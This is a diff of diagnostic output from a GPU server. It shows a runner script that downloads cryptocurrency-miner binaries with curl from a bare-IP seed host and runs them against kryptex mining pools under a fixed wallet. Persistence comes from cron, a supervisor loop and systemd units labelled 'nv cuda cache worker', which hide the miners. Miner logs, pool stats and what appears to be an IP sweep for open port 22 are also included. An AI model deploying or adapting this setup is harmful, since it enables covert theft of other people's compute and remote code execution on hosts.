@@ -1,16 +1,151 @@
-== azsweep read 2026-11-25T06:50:01Z
-RUNNING=no
---- lines=61
-IPS=59 ts=2026-11-25T06:24:01Z
-=== DONE 2026-11-25T06:26:58Z
---- open22=2
---- sample
-IPS=59 ts=2026-11-25T06:24:01Z
-=== DONE 2026-11-25T06:26:58Z
---- 22open list
---- gpu
-100 %, 349.50 W
+== diag3 t19-l40s1-eude2-canon 2026-11-25T07:42:17Z ip=149.81.10.242
+--- ls nv
+total 66168
+drwxr-xr-x 4 root root     4096 Nov 23 00:44 .
+drwxr-xr-x 6 root root     4096 Nov 25 06:44 ..
+-rw-r--r-- 1 root root       14 Nov 22 22:27 fip
+-rw-r--r-- 1 root root       68 Nov 22 22:27 gpu.txt
+-rw-r--r-- 1 root root        0 Nov 25 07:40 keep.lock
+-rwxr-xr-x 1 root root     3463 Nov 22 22:23 keep.sh
+drwxr-xr-x 2 root root     4096 Nov 23 00:40 logs
+-rwxr-xr-x 1 root root 46116552 Nov 22 22:27 peakminer
+drwxr-xr-x 2 root root     4096 Nov 22 22:27 run
+-rwxr-xr-x 1 root root     1943 Nov 22 22:23 run-g.sh
+-rwxr-xr-x 1 root root 21601960 Nov 22 22:27 srb
+-rwxr-xr-x 1 root root       59 Nov 23 00:44 supervisor.sh
+--- run.sh
+--- run-g.sh
+#!/bin/bash
+# per-GPU runner v2 (i70783) - /opt/nv/run-g.sh
+N="$1"
+D=/opt/nv
+W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
+SEED='http://163.68.86.6:8090'
+POOLS="stratum+ssl://prl-sg.kryptex.network:8048 stratum+tcp://prl-sg.kryptex.network:7048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-ae.kryptex.network:8048"
+mkdir -p "$D/logs" "$D/run"
+exec 8>"$D/run/g$N.lock"
+flock -n 8 || exit 0
+ensure() { f="$1"; min="$2"; if [ ! -f "$f" ] || [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -lt "$min" ]; then curl -sf -m 300 "$SEED/$(basename "$f")" -o "$f.tmp" && chmod 755 "$f.tmp" && mv -f "$f.tmp" "$f"; fi; }
+FIP=$(cat "$D/fip" 2>/dev/null)
+case "$FIP" in *[0-9].[0-9]*) ;; *) FIP=$(curl -s -m 8 http://ifconfig.me 2>/dev/null); echo "$FIP" > "$D/fip";; esac
+FIPD=$(echo "$FIP" | tr '.' '-')
+WRK="ul-t19-$FIPD-g$N"
+DEV=$(nvidia-smi --query-gpu=name --format=csv,noheader -i "$N" 2>/dev/null | head -1)
+echo "[$(date -u +%FT%TZ)] run-g $N dev=$DEV fip=$FIP wrk=$WRK" >> "$D/logs/run.log"
+if echo "$DEV" | grep -Eiq 'V100|P100|P40|P4|P6|T4|Quadro'; then
+  ensure "$D/srb" 20000000
+  while true; do
+    for P in $POOLS; do
+      echo "[$(date -u +%FT%TZ)] srb try $P $WRK" >> "$D/logs/run.log"
+      timeout 300 "$D/srb" --algorithm pearlhash --pool "$P" --wallet "$W.$WRK" --password x \
+        --disable-cpu --gpu-id "$N" --log-file "$D/logs/g$N.log" >> "$D/logs/g$N.out" 2>&1
+      sleep 5
+--- supervisor
+#!/bin/bash
+while true; do /opt/nv/keep.sh; sleep 60; done
+--- units
+actions.runner.dongsuju-ul-plant.ul-l40s-7621.service
+cloud-config.target.wants
+cloud-final.service.wants
+cloud-init.target.wants
+dbus-org.freedesktop.resolve1.service
+dbus-org.freedesktop.timesync1.service
+emergency.target.wants
+final.target.wants
+getty.target.wants
+iscsi.service
+mdmonitor.service.wants
+multi-user.target.wants
+multipath-tools.service
+network-online.target.wants
+nv-cuda-cache.service
+nv-cuda-cache@.service
+nv-cuda-cache@0.service
+nv-cuda-cache@g0.service
+nv-t19.service
+nv-t19v.service
+open-vm-tools.service.requires
+paths.target.wants
+rescue.target.wants
+sleep.target.wants
+snap-core22-3129.mount
+snap-lxd-41283.mount
+snap-snapd-28332.mount
+snap.lxd.activate.service
+snap.lxd.daemon.service
+snap.lxd.daemon.unix.socket
+snap.lxd.user-daemon.service
+snap.lxd.user-daemon.unix.socket
+snapd.mounts.target.wants
+sockets.target.wants
+sshd.service
+sudo.service
+supervisor.service
+sysinit.target.wants
+syslog.service
+systemd-hibernate.service.wants
+--- nv unit
+[Unit]
+Description=nv cuda cache worker %i
+After=network-online.target
+[Service]
+Type=simple
+EnvironmentFile=/opt/ul/conf/%i.env
+ExecStart=/opt/ul/respawn.sh %i
+Restart=always
+RestartSec=5
+Nice=19
+[Install]
+WantedBy=multi-user.target
+--- procs
+2565998       1 /opt/ul-t2/krig-miner --algo pearlhash --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.netw
+2566434       1 /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl:/
+2566469 2566434 /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl:/
+--- bins
+/opt/ul-t2/krig-miner
+/opt/ul-t2/peakminer
+/opt/nv/peakminer
+--- logs
+## /opt/nv/logs/g0.log
+───  ────  ──────────  ─────────────  ─────  ────  ─────  ──────────  ────────  ────────
+  0  L40S   81.3 TH/s       0 / 0      77°C     —   251W  324.1 GH/W   9001MHz   1275MHz
+───  ────  ──────────  ─────────────  ─────  ────  ─────  ──────────  ────────  ────────
+Total       81.3 TH/s       0 / 0     eff —         251W  324.1 GH/W
+────────────────────────────────────────────────────────────────────── peakminer:v2.20.8
+
+## /opt/nv/logs/run.log
+[2026-11-22T22:28:15Z] run-g 0 dev=NVIDIA L40S fip=149.81.10.242 wrk=ul-t19-149-81-10-242-g0
+[2026-11-22T22:31:37Z] run-g 0 dev=NVIDIA L40S fip=149.81.10.242 wrk=ul-t19-149-81-10-242-g0
+[2026-11-25T06:45:06Z] run-g 0 dev=NVIDIA L40S fip=149.81.10.242 wrk=ul-t19-149-81-10-242-g0
+[2026-11-25T07:00:05Z] run-g 0 dev=NVIDIA L40S fip=149.81.10.242 wrk=ul-t19-149-81-10-242-g0
+[2026-11-25T07:10:05Z] run-g 0 dev=NVIDIA L40S fip=149.81.10.242 wrk=ul-t19-149-81-10-242-g0
+[2026-11-25T07:40:06Z] run-g 0 dev=NVIDIA L40S fip=149.81.10.242 wrk=ul-t19-149-81-10-242-g0
+## /opt/nv/logs/keep.log
+[2026-11-22T22:31:36Z] respawn g0 (149-81-10-242) roots_empty
+[2026-11-25T06:45:06Z] respawn g0 (149-81-10-242) roots_empty
+[2026-11-25T07:00:05Z] respawn g0 (149-81-10-242) roots_empty
+[2026-11-25T07:10:05Z] respawn g0 (149-81-10-242) roots_empty
+[2026-11-25T07:15:06Z] dedupe kill g0 root=2560160
+[2026-11-25T07:40:06Z] respawn g0 (149-81-10-242) roots_empty
 --- pool
-"miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-t19-149-81-10-242-g0","scheme":"pps","status":"online","opened_at":1795589111662,"coin":"prl","last_share":1795589308363,"last_active":1795589308361,"valid":2574,"stale":4,"invalid":0,"avg_hashrate_24h":"266775727926877.3","avg_hashrate_3h":"103415991443322.51","avg_hashrate_30m":"95075992133377.13777777777778","agent":"peakminer/2.20.8","latest_agent":"peakminer/2.21.0","download_url":"https://www.miner.download/en/peakminer","country":"US","legacy_port":false,"ru_v1":false,"server_geo":"sg"},
-"miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-149-81-10-242-g0","scheme":"pps","status":"offline","opened_at":1795569419027,"coin":"prl","last_share":1795589065351,"last_active":1795589065350,"valid":257,"stale":0,"invalid":0,"avg_hashrate_24h":"25124247921210.41","avg_hashrate_3h":"93407992271388.07","avg_hashrate_30m":"80063993375475.48444444444444","agent":"tw-pearl-miner/3.5.1","latest_agent":"tw-pearl-miner/3.5.1","download_url":"https://www.miner.download/en/tw-pearl-miner","country":"US","legacy_port":false,"ru_v1":false,"server_geo":"eu"},
+ul-t2-ps-t19-l40s1-eude2-canon-g0 :: 
+ul-t19-149-81-10-242-g0 :: "miner":"prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz","worker":"ul-t19-149-81-10-242-g0","scheme":"pps","status":"online","opened_at":1795592411786,"coin":"prl","last_share":1795590784491,"last_active
+--- net
+prl-sg.kryptex.network:8048 OPEN
+prl-sg.kryptex.network:7048 OPEN
+pool.pearlhash.xyz:9443 OPEN
+pool.pearlhash.xyz:9000 OPEN
+--- ul-t2 log
+--- cron
+@reboot /opt/ul-t2/keep.sh
+*/5 * * * * /opt/ul-t2/keep.sh
+*/2 * * * * /home/ubuntu/ul2/poll.sh
+-- ul2 poll
+total 24
+drwxrwxr-x 3 ubuntu ubuntu 4096 Nov 25 06:25 .
+drwxr-x--- 9 ubuntu ubuntu 4096 Nov 25 05:59 ..
+-rw-rw-r-- 1 ubuntu ubuntu 1702 Nov 25 06:26 azsweep.out
+-rwxrwxr-x 1 ubuntu ubuntu 1181 Nov 25 06:24 azsweep.sh
+drwxrwxr-x 2 ubuntu ubuntu 4096 Nov 25 05:59 bk
+-rwxrwxr-x 1 ubuntu ubuntu  876 Nov 25 06:25 poll.sh
 done
